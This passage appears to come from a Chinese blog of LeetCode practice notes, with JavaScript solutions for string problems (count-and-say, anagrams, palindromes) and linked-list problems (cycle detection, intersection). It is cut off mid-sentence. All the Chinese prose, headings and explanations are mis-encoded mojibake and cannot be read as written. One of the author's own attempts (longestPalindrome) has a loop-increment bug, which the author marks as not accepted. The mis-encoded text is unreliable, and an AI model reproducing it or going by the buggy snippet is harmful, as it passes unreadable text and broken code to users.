MAX_SAFE_32_INT = <span class="built_in">Math</span>.pow(<span class="number">2</span>,<span class="number">31</span>) - <span class="number">1</span></span><br><span class="line">    <span class="keyword">const</span> MIN_SAFE_32_INT = -<span class="built_in">Math</span>.pow(<span class="number">2</span>, <span class="number">31</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 4.Convert number and avoid overflow</span></span><br><span class="line">    <span class="keyword">while</span> (index &lt; length &amp;&amp; str[index].match(<span class="regexp">/[0-9]/</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> digit = str.charAt(index) - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (digit &lt; <span class="number">0</span> || digit &gt; <span class="number">9</span>) <span class="keyword">break</span>;</span><br><span class="line">        <span class="comment">// check if total will be overflow after 10 times and add digit</span></span><br><span class="line">        <span class="keyword">if</span> (total &gt; <span class="built_in">Math</span>.floor(MAX_SAFE_32_INT / <span class="number">10</span>) ||</span><br><span class="line">        (total === <span class="built_in">Math</span>.floor(MAX_SAFE_32_INT / <span class="number">10</span>) &amp;&amp; digit &gt; MAX_SAFE_32_INT % <span class="number">10</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> (sign === <span class="number">1</span>) ? MAX_SAFE_32_INT  : MIN_SAFE_32_INT ;</span><br><span class="line">        &#125;</span><br><span class="line">        total = total * <span class="number">10</span> + digit;</span><br><span class="line">        index++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> total * sign;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="LeetCode38â€”â€”å¤–è§‚æ•°åˆ—ï¼ˆâ˜†â˜†ï¼‰"><a href="#LeetCode38â€”â€”å¤–è§‚æ•°åˆ—ï¼ˆâ˜†â˜†ï¼‰" class="headerlink" title="LeetCode38â€”â€”å¤–è§‚æ•°åˆ—ï¼ˆâ˜†â˜†ï¼‰"></a>LeetCode38â€”â€”å¤–è§‚æ•°åˆ—ï¼ˆâ˜†â˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/count-and-say/">è·³è½¬åœ°å€</a></p><h3 id="è‡ªå·±çš„ä»£ç -29"><a href="#è‡ªå·±çš„ä»£ç -29" class="headerlink" title="è‡ªå·±çš„ä»£ç "></a>è‡ªå·±çš„ä»£ç </h3><p>çœ‹è§é€’å½’å°±æ²¡æœ‰æ€è·¯äº†ã€‚ã€‚</p><h3 id="æ€è·¯-amp-é¢˜è§£-14"><a href="#æ€è·¯-amp-é¢˜è§£-14" class="headerlink" title="æ€è·¯&amp;é¢˜è§£"></a>æ€è·¯&amp;é¢˜è§£</h3><p>é€’å½’+æ­£åˆ™ï¼š</p><ul><li>/(\d)\1*/g  è¿™ä¸ªæ­£åˆ™è¡¨ç¤ºï¼Œå…¨å±€åŒ¹é…ï¼ŒåŒ¹é…ä¸€ä½æ•°å­—æˆ–è€…åŒ¹é…ç›¸åŒçš„å¤šä½æ•°å­—ã€‚ (\d)\1åŒ¹é…ä¸¤ä¸ªè¿ç»­æ•°å­—å­—ç¬¦ï¼Œå› ä¸º\1æ˜¯å¯¹(\d)çš„å¼•ç”¨ã€‚ *ä¿®é¥°\1ï¼Œè¡¨ç¤ºå¯ä»¥æœ‰0æˆ–å¤šä¸ªã€‚</li><li>å¯¹n-1æ—¶äº§ç”Ÿçš„æ•°ç»„ï¼Œç”¨ length+å€¼  ç¡®å®šnçš„æ•°ç»„ã€‚æ¯”å¦‚ï¼Œ[â€˜21â€™]=&gt;â€™2â€™çš„length+â€™2â€™  +  â€˜1â€™çš„length+â€™1â€™=&gt;â€™1211â€™</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> countAndSay = <span class="function"><span class="keyword">function</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (n === <span class="number">1</span>) <span class="keyword">return</span> <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    <span class="keyword">const</span> temp = countAndSay(n-<span class="number">1</span>).match(<span class="regexp">/(\d)\1*/g</span>)</span><br><span class="line">    <span class="keyword">let</span> result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; temp.length; i++) &#123;</span><br><span class="line">        result += (temp[i].length + <span class="string">&#x27;&#x27;</span> + temp[i].substring(<span class="number">0</span>, <span class="number">1</span>))</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="LeetCode58â€”â€”æœ€åä¸€ä¸ªå•è¯çš„é•¿åº¦ï¼ˆâ˜†ï¼‰"><a href="#LeetCode58â€”â€”æœ€åä¸€ä¸ªå•è¯çš„é•¿åº¦ï¼ˆâ˜†ï¼‰" class="headerlink" title="LeetCode58â€”â€”æœ€åä¸€ä¸ªå•è¯çš„é•¿åº¦ï¼ˆâ˜†ï¼‰"></a>LeetCode58â€”â€”æœ€åä¸€ä¸ªå•è¯çš„é•¿åº¦ï¼ˆâ˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/to-lower-case/">è·³è½¬åœ°å€</a></p><h3 id="æ€è·¯-amp-é¢˜è§£-15"><a href="#æ€è·¯-amp-é¢˜è§£-15" class="headerlink" title="æ€è·¯&amp;é¢˜è§£"></a>æ€è·¯&amp;é¢˜è§£</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> lengthOfLastWord = <span class="function"><span class="keyword">function</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> s.trim().split(<span class="string">&quot; &quot;</span>).pop().length;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>è¿™ç±»é¢˜ç›®ä¸€å®šè¦ç†Ÿç»ƒè¿ç”¨ api å•¦ã€‚</p><h2 id="LeetCode541â€”â€”åè½¬å­—ç¬¦ä¸²-IIï¼ˆâ˜†ï¼‰"><a href="#LeetCode541â€”â€”åè½¬å­—ç¬¦ä¸²-IIï¼ˆâ˜†ï¼‰" class="headerlink" title="LeetCode541â€”â€”åè½¬å­—ç¬¦ä¸² IIï¼ˆâ˜†ï¼‰"></a>LeetCode541â€”â€”åè½¬å­—ç¬¦ä¸² IIï¼ˆâ˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/reverse-string-ii/">è·³è½¬åœ°å€</a></p><p>è¿˜æ˜¯ä¸ç†Ÿç»ƒå•Šã€‚</p><h3 id="æ€è·¯-amp-é¢˜è§£-16"><a href="#æ€è·¯-amp-é¢˜è§£-16" class="headerlink" title="æ€è·¯&amp;é¢˜è§£"></a>æ€è·¯&amp;é¢˜è§£</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> reverseStr = <span class="function"><span class="keyword">function</span> (<span class="params">s, k</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> res = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; s.length; i += <span class="number">2</span> * k)&#123;</span><br><span class="line">        res += s.slice(i, i + k).split(<span class="string">&quot;&quot;</span>).reverse().join(<span class="string">&quot;&quot;</span>) + s.slice(i + k, i + <span class="number">2</span> * k);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="LeetCode49â€”â€”å­—æ¯å¼‚ä½è¯åˆ†ç»„ï¼ˆâ˜†â˜†ï¼‰"><a href="#LeetCode49â€”â€”å­—æ¯å¼‚ä½è¯åˆ†ç»„ï¼ˆâ˜†â˜†ï¼‰" class="headerlink" title="LeetCode49â€”â€”å­—æ¯å¼‚ä½è¯åˆ†ç»„ï¼ˆâ˜†â˜†ï¼‰"></a>LeetCode49â€”â€”å­—æ¯å¼‚ä½è¯åˆ†ç»„ï¼ˆâ˜†â˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/group-anagrams/">è·³è½¬åœ°å€</a></p><h3 id="è‡ªå·±çš„ä»£ç -30"><a href="#è‡ªå·±çš„ä»£ç -30" class="headerlink" title="è‡ªå·±çš„ä»£ç "></a>è‡ªå·±çš„ä»£ç </h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> groupAnagrams = <span class="function"><span class="keyword">function</span> (<span class="params">strs</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> map = &#123;&#125;, res = [];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i <span class="keyword">of</span> strs) &#123;</span><br><span class="line">    <span class="keyword">let</span> str = i.split(<span class="string">&#x27;&#x27;</span>).sort().join(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    map[str] ? map[str].push(i) : map[str] = [i];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i <span class="keyword">in</span> map) &#123;</span><br><span class="line">    res.push(map[i])</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> res ;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="LeetCode438â€”â€”æ‰¾åˆ°å­—ç¬¦ä¸²ä¸­æ‰€æœ‰å­—æ¯å¼‚ä½è¯ï¼ˆâ˜†â˜†ï¼‰"><a href="#LeetCode438â€”â€”æ‰¾åˆ°å­—ç¬¦ä¸²ä¸­æ‰€æœ‰å­—æ¯å¼‚ä½è¯ï¼ˆâ˜†â˜†ï¼‰" class="headerlink" title="LeetCode438â€”â€”æ‰¾åˆ°å­—ç¬¦ä¸²ä¸­æ‰€æœ‰å­—æ¯å¼‚ä½è¯ï¼ˆâ˜†â˜†ï¼‰"></a>LeetCode438â€”â€”æ‰¾åˆ°å­—ç¬¦ä¸²ä¸­æ‰€æœ‰å­—æ¯å¼‚ä½è¯ï¼ˆâ˜†â˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/find-all-anagrams-in-a-string/">è·³è½¬åœ°å€</a></p><h3 id="æ€è·¯1-amp-é¢˜è§£-13"><a href="#æ€è·¯1-amp-é¢˜è§£-13" class="headerlink" title="æ€è·¯1&amp;é¢˜è§£"></a>æ€è·¯1&amp;é¢˜è§£</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> findAnagrams = <span class="function"><span class="keyword">function</span>(<span class="params">s, p</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> result = [];</span><br><span class="line">  <span class="keyword">if</span> (p.length &gt; s.length) <span class="keyword">return</span> result;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">let</span> left = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">let</span> right = p.length;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">while</span>(left &lt; s.length) &#123;</span><br><span class="line">    <span class="keyword">let</span> tmp = s.substring(left,right);</span><br><span class="line">    <span class="keyword">if</span> ( tmp.split(<span class="string">&#x27;&#x27;</span>).sort().join(<span class="string">&#x27;&#x27;</span>) === p.split(<span class="string">&#x27;&#x27;</span>).sort().join(<span class="string">&#x27;&#x27;</span>))&#123;</span><br><span class="line">      result.push(left);</span><br><span class="line">    &#125;</span><br><span class="line">    left++;</span><br><span class="line">    right++;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>è™½ç„¶è¶…æ—¶ï¼Œä½†æ˜¯å…¶ä»–é¢˜è§£çœŸçœ‹ä¸æ‡‚è¯¶ã€‚ã€‚</p><h3 id="æ€è·¯2-amp-é¢˜è§£ï¼ˆto-understandï¼‰"><a href="#æ€è·¯2-amp-é¢˜è§£ï¼ˆto-understandï¼‰" class="headerlink" title="æ€è·¯2&amp;é¢˜è§£ï¼ˆto understandï¼‰"></a>æ€è·¯2&amp;é¢˜è§£ï¼ˆto understandï¼‰</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> findAnagrams = <span class="function">(<span class="params">s, p</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> output = [], neededChars = &#123;&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> char <span class="keyword">of</span> p) &#123;</span><br><span class="line">        neededChars[char] ? neededChars[char]++ : neededChars[char] = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> left = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> right = <span class="number">0</span>; </span><br><span class="line">    <span class="keyword">let</span> count = p.length </span><br><span class="line">    <span class="keyword">while</span> (right &lt; s.length) &#123;</span><br><span class="line">        <span class="keyword">if</span> (neededChars[s[right]] &gt; <span class="number">0</span>) count--;</span><br><span class="line">        neededChars[s[right]]--;</span><br><span class="line">        right++;</span><br><span class="line">        <span class="keyword">if</span> (count === <span class="number">0</span>) output.push(left);</span><br><span class="line">        <span class="keyword">if</span> (right - left == p.length) &#123;</span><br><span class="line">            <span class="keyword">if</span> (neededChars[s[left]] &gt;= <span class="number">0</span>) count++;</span><br><span class="line">            neededChars[s[left]]++;</span><br><span class="line">            left++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> output;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="LeetCode680â€”â€”éªŒè¯å›æ–‡å­—ç¬¦ä¸²-â…¡ï¼ˆâ˜†ï¼‰"><a href="#LeetCode680â€”â€”éªŒè¯å›æ–‡å­—ç¬¦ä¸²-â…¡ï¼ˆâ˜†ï¼‰" class="headerlink" title="LeetCode680â€”â€”éªŒè¯å›æ–‡å­—ç¬¦ä¸² â…¡ï¼ˆâ˜†ï¼‰"></a>LeetCode680â€”â€”éªŒè¯å›æ–‡å­—ç¬¦ä¸² â…¡ï¼ˆâ˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/valid-palindrome-ii/">è·³è½¬åœ°å€</a></p><p>å¥½éš¾å•Šã€‚</p><h3 id="æ€è·¯-amp-é¢˜è§£-17"><a href="#æ€è·¯-amp-é¢˜è§£-17" class="headerlink" title="æ€è·¯&amp;é¢˜è§£"></a>æ€è·¯&amp;é¢˜è§£</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> validPalindrome = <span class="function"><span class="keyword">function</span> (<span class="params">s, flag = <span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> left = <span class="number">0</span>, right = s.length - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">        <span class="keyword">if</span> (s[left] === s[right]) &#123;</span><br><span class="line">            left++;</span><br><span class="line">            right--;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (flag) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> validPalindrome(s.slice(left, right), <span class="literal">true</span>) || validPalindrome(s.slice(left + <span class="number">1</span>, right + <span class="number">1</span>), <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="LeetCode5â€”â€”æœ€é•¿å›æ–‡å­ä¸²ï¼ˆâ˜†ï¼‰"><a href="#LeetCode5â€”â€”æœ€é•¿å›æ–‡å­ä¸²ï¼ˆâ˜†ï¼‰" class="headerlink" title="LeetCode5â€”â€”æœ€é•¿å›æ–‡å­ä¸²ï¼ˆâ˜†ï¼‰"></a>LeetCode5â€”â€”æœ€é•¿å›æ–‡å­ä¸²ï¼ˆâ˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/longest-palindromic-substring/">è·³è½¬åœ°å€</a></p><h3 id="è‡ªå·±çš„ä»£ç -31"><a href="#è‡ªå·±çš„ä»£ç -31" class="headerlink" title="è‡ªå·±çš„ä»£ç "></a>è‡ªå·±çš„ä»£ç </h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> longestPalindrome = <span class="function"><span class="keyword">function</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> count = <span class="number">0</span>, res = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; s.length; j++)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> j = s.length-<span class="number">1</span>; j &gt; i; j--)&#123;</span><br><span class="line">            <span class="keyword">let</span> newStr = s.slice(i, j);</span><br><span class="line">            <span class="keyword">if</span> (newStr.split(<span class="string">&quot;&quot;</span>).reverse().join(<span class="string">&quot;&quot;</span>) === newStr &amp;&amp; count &lt; j - i) &#123;</span><br><span class="line">                count = j - i;</span><br><span class="line">                res = newStr;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>æœªACï¼Œè¶…æ—¶äº†ã€‚</p><h3 id="æ€è·¯-amp-é¢˜è§£-18"><a href="#æ€è·¯-amp-é¢˜è§£-18" class="headerlink" title="æ€è·¯&amp;é¢˜è§£"></a>æ€è·¯&amp;é¢˜è§£</h3><h1 id="é“¾è¡¨éƒ¨åˆ†"><a href="#é“¾è¡¨éƒ¨åˆ†" class="headerlink" title="é“¾è¡¨éƒ¨åˆ†"></a>é“¾è¡¨éƒ¨åˆ†</h1><h2 id="LeetCode141â€”â€”ç¯å½¢é“¾è¡¨ï¼ˆâ˜†ï¼‰"><a href="#LeetCode141â€”â€”ç¯å½¢é“¾è¡¨ï¼ˆâ˜†ï¼‰" class="headerlink" title="LeetCode141â€”â€”ç¯å½¢é“¾è¡¨ï¼ˆâ˜†ï¼‰"></a>LeetCode141â€”â€”ç¯å½¢é“¾è¡¨ï¼ˆâ˜†ï¼‰</h2><p>è·³è½¬åœ°å€</p><h3 id="è‡ªå·±çš„ä»£ç -32"><a href="#è‡ªå·±çš„ä»£ç -32" class="headerlink" title="è‡ªå·±çš„ä»£ç "></a>è‡ªå·±çš„ä»£ç </h3><p>æ­£å¸¸åšæ³•å°±æ˜¯åˆ›å»ºç©ºæ•°ç»„ï¼ˆæˆ–setï¼‰ï¼Œç„¶åéå†åˆ¤æ–­ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> hasCycle = <span class="function"><span class="keyword">function</span> (<span class="params">head</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> set = <span class="keyword">new</span> <span class="built_in">Set</span>();</span><br><span class="line">    <span class="keyword">while</span> (head) &#123;</span><br><span class="line">        <span class="keyword">if</span> (set.has(head)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">        set.add(head);</span><br><span class="line">        head = head.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="æ€è·¯1-amp-é¢˜è§£-14"><a href="#æ€è·¯1-amp-é¢˜è§£-14" class="headerlink" title="æ€è·¯1&amp;é¢˜è§£"></a>æ€è·¯1&amp;é¢˜è§£</h3><p><strong>æ±¡é“¾è¡¨æ³•</strong>ï¼šåœ¨ Javascript é‡Œé¢å®šä¹‰çš„ä»»ä½•æ•°æ®ç»“æ„ï¼Œå…¶ç±»å‹éƒ½æ˜¯object ã€‚è¿™æ„å‘³ç€ï¼Œå¯ä»¥ç»™ä¸€ä¸ªå¯¹è±¡è®¾å®šä»»ä½•çš„å±æ€§ã€‚æˆ‘ä»¬ä¸ºæ¯æ¬¡éå†çš„èŠ‚ç‚¹è®¾å®šä¸€ä¸ªæ ‡è®°ï¼Œå¦‚æœå­˜åœ¨ç¯ï¼Œé‚£ä¹ˆä¸€å®šå­˜åœ¨æŸä¸ªèŠ‚ç‚¹å·²ç»è®¾å®šè¿‡æ ‡è®°ã€‚å¦åˆ™é“¾è¡¨éå†ç»“æŸå…¶ä¸ä¸ºç¯ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> hasCycle = <span class="function"><span class="keyword">function</span>(<span class="params">head</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">while</span> (head) &#123;</span><br><span class="line">    <span class="keyword">if</span> (head.flag) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    head.flag = <span class="literal">true</span>;</span><br><span class="line">    head = head.next;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="æ€è·¯2-amp-é¢˜è§£-15"><a href="#æ€è·¯2-amp-é¢˜è§£-15" class="headerlink" title="æ€è·¯2&amp;é¢˜è§£"></a>æ€è·¯2&amp;é¢˜è§£</h3><p><strong>å¿«æ…¢æŒ‡é’ˆï¼š</strong></p><ul><li>å®šä¹‰â€œå¿«æŒ‡é’ˆ fastpâ€ã€â€œæ…¢æŒ‡é’ˆ slowpâ€ï¼Œâ€œå¿«æŒ‡é’ˆâ€æ€»æ¯”â€œæ…¢æŒ‡é’ˆâ€å¿«ä¸€æ­¥ã€‚</li><li>è¿›å…¥ç¯å½¢é“¾è¡¨ï¼Œå½“ fastp === slowpï¼Œè¯´æ˜â€œå¿«æŒ‡é’ˆâ€è¿½ä¸Šäº†â€œæ…¢æŒ‡é’ˆâ€ã€‚</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> hasCycle = <span class="function"><span class="keyword">function</span> (<span class="params">head</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!head) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> slowp = head, fastp = head;</span><br><span class="line">    <span class="keyword">while</span> (fastp.next !== <span class="literal">null</span> &amp;&amp; fastp.next.next !== <span class="literal">null</span>) &#123;</span><br><span class="line">        slowp = slowp.next;</span><br><span class="line">        fastp = fastp.next.next;</span><br><span class="line">        <span class="keyword">if</span> (slowp === fastp) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="LeetCode160â€”â€”ç›¸äº¤é“¾è¡¨ï¼ˆâ˜†ï¼‰"><a href="#LeetCode160â€”â€”ç›¸äº¤é“¾è¡¨ï¼ˆâ˜†ï¼‰" class="headerlink" title="LeetCode160â€”â€”ç›¸äº¤é“¾è¡¨ï¼ˆâ˜†ï¼‰"></a>LeetCode160â€”â€”ç›¸äº¤é“¾è¡¨ï¼ˆâ˜†ï¼‰</h2><p>è·³è½¬åœ°å€</p><h3 id="è‡ªå·±çš„ä»£ç -33"><a href="#è‡ªå·±çš„ä»£ç -33" class="headerlink" title="è‡ªå·±çš„ä»£ç "></a>è‡ªå·±çš„ä»£ç </h3><p>æ²¡æœ‰æ€è·¯ï¼ŒåŒæŒ‡é’ˆéå†ä¹Ÿä¸ä¼šåšã€‚</p><h3 id="æ€è·¯1-amp-é¢˜è§£-15"><a href="#æ€è·¯1-amp-é¢˜è§£-15" class="headerlink" title="æ€è·¯1&amp;é¢˜è§£"></a>æ€è·¯1&amp;é¢˜è§£</h3><p><strong>å“ˆå¸Œé›†åˆ</strong></p><p>é¦–å…ˆéå†é“¾è¡¨ headAï¼Œå¹¶å°†æ¯ä¸ªèŠ‚ç‚¹åŠ å…¥å“ˆå¸Œé›†åˆä¸­ï¼ˆåŸæ¥ Set å°±æ˜¯å“ˆå¸Œé›†åˆï¼‰ã€‚ç„¶åéå†é“¾è¡¨ headBï¼Œå¯¹äºéå†åˆ°çš„æ¯ä¸ªèŠ‚ç‚¹ï¼Œåˆ¤æ–­è¯¥èŠ‚ç‚¹æ˜¯å¦åœ¨å“ˆå¸Œé›†åˆä¸­ï¼š</p><ul><li><p>å¦‚æœå½“å‰èŠ‚ç‚¹ä¸åœ¨å“ˆå¸Œé›†åˆä¸­ï¼Œåˆ™ç»§ç»­éå†ä¸‹ä¸€ä¸ªèŠ‚ç‚¹ï¼›</p></li><li><p>å¦‚æœå½“å‰èŠ‚ç‚¹åœ¨å“ˆå¸Œé›†åˆä¸­ï¼Œ<strong>åˆ™åé¢çš„èŠ‚ç‚¹éƒ½åœ¨å“ˆå¸Œé›†åˆä¸­</strong>ï¼ˆåº”è¯¥æ˜¯ä¸ä¼šå‡ºç°åˆ†å‰çš„æƒ…å†µï¼‰ï¼Œå³ä»å½“å‰èŠ‚ç‚¹å¼€å§‹çš„æ‰€æœ‰èŠ‚ç‚¹éƒ½åœ¨ä¸¤ä¸ªé“¾è¡¨çš„ç›¸äº¤éƒ¨åˆ†ï¼Œå› æ­¤è¿”å›ç¬¬ä¸€ä¸ªç›¸äº¤èŠ‚ç‚¹ã€‚</p></li><li><p>å¦‚æœé“¾è¡¨ headB ä¸­çš„æ‰€æœ‰èŠ‚ç‚¹éƒ½ä¸åœ¨å“ˆå¸Œé›†åˆä¸­ï¼Œåˆ™ä¸¤ä¸ªé“¾è¡¨ä¸ç›¸äº¤ï¼Œè¿”å› nullã€‚</p></li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> getIntersectionNode = <span class="function"><span class="keyword">function</span>(<span class="params">headA, headB</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> visited = <span class="keyword">new</span> <span class="built_in">Set</span>();</span><br><span class="line">    <span class="keyword">let</span> temp = headA;</span><br><span class="line">    <span class="keyword">while</span> (temp !== <span class="literal">null</span>) &#123;</span><br><span class="line">        visited.add(temp);</span><br><span class="line">        temp = temp.next;</span><br><span class="line">    &#125;</span><br><span class="line">    temp = headB;</span><br><span class="line">    <span class="keyword">while</span> (temp !== <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (visited.has(temp)) &#123;</span><br><span class="line">            <span class="keyword">return</span> temp;</span><br><span class="line">        &#125;</span><br><span class="line">        temp = temp.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="å¤æ‚åº¦åˆ†æ-18"><a href="#å¤æ‚åº¦åˆ†æ-18" class="headerlink" title="å¤æ‚åº¦åˆ†æ"></a>å¤æ‚åº¦åˆ†æ</h3><p>æ—¶é—´å¤æ‚åº¦ï¼šO(m+n)ï¼Œå…¶ä¸­ m å’Œ n æ˜¯åˆ†åˆ«æ˜¯é“¾è¡¨ headA å’Œ headB çš„é•¿åº¦ã€‚éœ€è¦éå†ä¸¤ä¸ªé“¾è¡¨å„ä¸€æ¬¡ã€‚</p><p>ç©ºé—´å¤æ‚åº¦ï¼šO(m)ï¼Œå…¶ä¸­ m æ˜¯é“¾è¡¨ headA çš„é•¿åº¦ã€‚éœ€è¦ä½¿ç”¨å“ˆå¸Œé›†åˆå­˜å‚¨é“¾è¡¨ headA ä¸­çš„å…¨éƒ¨èŠ‚ç‚¹ã€‚</p><h3 id="æ€è·¯2-amp-é¢˜è§£-16"><a href="#æ€è·¯2-amp-é¢˜è§£-16" class="headerlink" title="æ€è·¯2&amp;é¢˜è§£"></a>æ€è·¯2&amp;é¢˜è§£</h3><p><strong>åŒæŒ‡é’ˆ</strong>ï¼š**â€é”™çš„äººå°±ç®—èµ°è¿‡äº†å¯¹æ–¹çš„è·¯ä¹Ÿè¿˜æ˜¯ä¼šé”™è¿‡â€**</p><p>åªæœ‰å½“é“¾è¡¨ headA å’Œ headB éƒ½ä¸ä¸ºç©ºæ—¶ï¼Œä¸¤ä¸ªé“¾è¡¨æ‰å¯èƒ½ç›¸äº¤ã€‚å› æ­¤é¦–å…ˆåˆ¤æ–­é“¾è¡¨ headA å’Œ headB æ˜¯å¦ä¸ºç©ºï¼Œå¦‚æœå…¶ä¸­è‡³å°‘æœ‰ä¸€ä¸ªé“¾è¡¨ä¸ºç©ºï¼Œåˆ™ä¸¤ä¸ªé“¾è¡¨ä¸€å®šä¸ç›¸äº¤ï¼Œè¿”å› nullã€‚</p><p>å½“é“¾è¡¨ headA å’Œ headB éƒ½ä¸ä¸ºç©ºæ—¶ï¼Œåˆ›å»ºä¸¤ä¸ªå¤´æŒ‡é’ˆ pA å’Œ pBï¼Œä¾æ¬¡éå†ä¸¤ä¸ªé“¾è¡¨çš„æ¯ä¸ªèŠ‚ç‚¹ï¼š</p><ul><li><p>æ¯æ­¥æ“ä½œéœ€è¦åŒæ—¶æ›´æ–°æŒ‡é’ˆ pA å’Œ pBã€‚</p></li><li><p>å¦‚æœæŒ‡é’ˆ pA ä¸ä¸ºç©ºï¼Œåˆ™å°†æŒ‡é’ˆ pA ç§»åˆ°ä¸‹ä¸€ä¸ªèŠ‚ç‚¹ï¼›å¦‚æœæŒ‡é’ˆ}pB ä¸ä¸ºç©ºï¼Œåˆ™å°†æŒ‡é’ˆ pB 